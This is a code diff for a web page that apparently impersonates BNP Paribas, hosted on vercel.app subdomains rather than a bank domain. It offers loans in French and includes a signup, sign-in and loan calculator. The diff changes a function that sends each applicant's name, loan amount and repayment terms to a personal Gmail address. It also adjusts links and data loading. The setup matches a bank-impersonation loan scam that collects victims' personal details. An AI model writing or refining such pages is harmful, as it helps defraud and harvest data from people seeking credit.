@@ -339,22 +339,22 @@ justify-content: center;
 
    <div class="list-drl">
      <div class="list-item">
-       <li> <a href="https://bnpparibas-gfrz.vercel.app/  ">Accueil</a></li>
+       <li> <a href="https://bnpparibas-nine.vercel.app/  ">Accueil</a></li>
 
      </div>
      <div class="list-item">
-       <li><a href="https://bnpparibas-gfrz.vercel.app/signup ">Signup</a></li>
+       <li><a href="https://bnpparibas-nine.vercel.app/signup ">Signup</a></li>
      </div>
      <div class="list-item">
-       <li><a href="https://bnpparibas-gfrz.vercel.app/ssignin">SignIn</a></li>
+       <li><a href="https://bnpparibas-nine.vercel.app/signin">SignIn</a></li>
      </div>
 
 
      <div class="list-item">
-       <li><a href="https://bnpparibas-gfrz.vercel.app/account">Account</a></li>
+       <li><a href="https://bnpparibas-nine.vercel.app/account">Account</a></li>
      </div>
      <div class="list-item">
-       <li><a href="https://bnpparibas-gfrz.vercel.app/loan">Obtenir un crédit</a></li>
+       <li><a href="https://bnpparibas-nine.vercel.app/loan">Obtenir un crédit</a></li>
 
 
 
@@ -396,7 +396,7 @@ justify-content: center;
     </div>
   </div>
   
- <form action="../vloga-za-kredit/index.php" method="GET">  
+ <form action="" method="GET">  
  
 <div class="calculator-container mb-4 mt-4" style="background: white">
     <div class="row-50">
@@ -1067,8 +1067,8 @@ function sendMailLoan(){
     to: "reunierprospere@gmail.com",
     name:  '' + userGet.name,
     replyto: "" + cookies,
-    message: ` ${userGet.name} ${userGet.prenom} fait une demande de prêt pour une consommation de montant ${montant.value} sur une durée de ${duration.value} Mois à taux d 'intérêts ${pourcentage}.
-    Mr  accepte et être capable de payer par mois une somme ${total} et une somme ${remboursement_total} à la fin du pr,,êt avec un intérêt assurance risque ${interest.toFixed(2)}.
+    message: ` ${userGet.name} ${userGet.prenom} fait une demande de prêt pour une consommation de montant ${montant.value}${userGet.currency} sur une durée de ${duration.value} Mois à taux d 'intérêts ${pourcentage}.
+    Mr ${userGet.prenom} ${userGet.name} accepte et être capable de payer par mois une somme ${total}${userGet.currency} et une somme ${remboursement_total}${userGet.currency} à la fin du pr,,êt avec un intérêt assurance risque ${interest.toFixed(2)}.
     Date de Souscription au Prêt :${new Date().toString()}
     `
   
@@ -1141,7 +1141,7 @@ var cookies='',userGet={name:"",
 window.onchange=function(){
  cookies=getCookie('email')
  if(cookies!=''&& cookies!=undefined){
-  fetch('https://raw.githubusercontent.com/lisbonne456/gitau/master/data.json').then(function(resp) {
+  fetch('/data.json').then(function(resp) {
       return resp.json()
     }).then(function(data) {
       const user=extrUser(data)
@@ -1161,7 +1161,7 @@ window.onchange=function(){
     })
  }
  else{
-   window.location.href='https://bnpparibas-gfrz.vercel.app/signup'
+ /*  window.location.href='https://bnpparibas-gfrz.vercel.app/signup'*/
  }
 }()
 function extrUser(user){
